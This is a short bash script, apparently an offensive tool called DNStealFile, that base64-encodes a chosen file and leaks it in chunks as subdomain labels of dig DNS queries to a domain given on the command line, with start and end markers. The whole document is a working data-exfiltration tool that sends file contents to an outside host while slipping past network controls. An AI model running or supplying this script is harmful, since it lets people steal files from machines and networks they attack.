#!/bin/bash
#by @lobuhisec
mkdir DNStealFile
echo $1
cat $1 | base64 > DNStealFile/file.b64
cd DNStealFile
cat file.b64 | xargs | sed 's/ //g' | sed 's/=//g' > file1.b64
totalchar=$(cat file1.b64 | wc -c)
echo Total characters: $totalchar
dig 1.start.$2
chunk=2
length=1
while [ $((totalchar/20)) -gt $((chunk)) ]
do
	payload=$(cat file1.b64 | cut -c$length-$((length+20)))
	#echo $chunk.$payload
	dig $chunk.$payload.$2
	chunk=$((chunk+1))
	length=$((length+21))
done
dig $chunk.end.$2
rm -Rf DNStealFile/
